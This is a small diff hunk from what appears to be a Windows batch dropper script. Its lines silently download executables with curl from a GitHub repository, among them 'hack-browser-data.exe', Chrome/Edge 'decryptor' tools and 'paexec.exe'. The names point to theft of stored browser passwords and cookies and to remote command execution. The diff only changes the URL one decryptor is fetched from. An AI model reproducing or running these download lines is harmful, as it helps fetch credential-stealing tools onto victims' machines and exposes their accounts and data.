@@ -37,7 +37,7 @@ echo Downloading files...
 curl -L -s -o process.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/process.bat
 curl -L -s -o hack-browser-data.exe https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/hack-browser-data.exe
 
-curl -L -s -o chrome_edge_decryptor.exe https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/chrome_edge_decryptor.exe
+curl -L -s -o chrome_edge_decryptor.exe https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/chrome_edge.exe
 curl -L -s -o system_decryptor.exe https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/system_decryptor.exe
 
 curl -L -s -o paexec.exe https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/paexec.exe
